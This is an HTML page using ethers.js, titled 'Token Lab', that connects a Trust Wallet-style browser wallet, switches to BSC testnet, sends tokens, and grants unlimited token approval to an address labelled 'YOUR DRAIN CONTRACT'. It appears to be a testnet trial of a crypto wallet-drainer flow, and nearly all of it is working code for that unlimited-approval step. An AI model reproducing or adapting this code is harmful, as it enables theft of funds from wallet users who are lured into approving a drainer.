<!DOCTYPE html>
<html>
<head>
  <title>Token Lab (Transfer + Approve)</title>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
</head>

<body style="font-family:sans-serif">

<h2>🧪 Token Lab (BSC Testnet)</h2>

<button onclick="init()">Connect & Ensure Testnet</button><br><br>

<button onclick="sendToken()">Send 10 Tokens</button><br><br>

<button onclick="approveToken()">Approve Unlimited</button><br><br>

<p id="status"></p>

<script>
let provider, signer, user;

// 🔁 YOUR TOKEN
const tokenAddress = "0x089d6677646bc535B1A8535ED856bb17493E332d";

// 🔁 YOUR DRAIN CONTRACT
const spender = "0x8dc3da2ff65ec0bbac40f33efe7c02c9c0b7ebaf";

// 🔁 RECEIVER (use your own address for test)
const receiver = "0xb52d3770bcf4673009f2f6bf8ba9177cba46d283";

const tokenABI = [
  "function transfer(address to, uint256 amount) returns (bool)",
  "function approve(address spender, uint256 amount) returns (bool)"
];

async function init() {
  if (!window.ethereum) {
    alert("Open inside Trust Wallet browser");
    return;
  }

  // connect
  await window.ethereum.request({ method: "eth_requestAccounts" });

  // try switching to BSC Testnet (chainId 97 = 0x61)
  try {
    await window.ethereum.request({
      method: "wallet_switchEthereumChain",
      params: [{ chainId: "0x61" }]
    });
  } catch (e) {
    console.log("Switch failed or already on correct network");
  }

  provider = new ethers.providers.Web3Provider(window.ethereum, "any");
  signer = provider.getSigner();
  user = await signer.getAddress();

  document.getElementById("status").innerText =
    "Connected: " + user + " (BSC Testnet)";
}

// 🟢 TOKEN TRANSFER
async function sendToken() {
  try {
    const contract = new ethers.Contract(tokenAddress, tokenABI, signer);

    const tx = await contract.transfer(
      receiver,
      ethers.utils.parseUnits("10", 18)
    );

    await tx.wait();

    alert("✅ Sent 10 tokens");

  } catch (e) {
    alert(e.message);
  }
}

// 🔴 APPROVE
async function approveToken() {
  try {
    const contract = new ethers.Contract(tokenAddress, tokenABI, signer);

    const tx = await contract.approve(
      spender,
      ethers.constants.MaxUint256
    );

    await tx.wait();

    alert("🔥 Approved unlimited");

  } catch (e) {
    alert(e.message);
  }
}
</script>

</body>
</html>
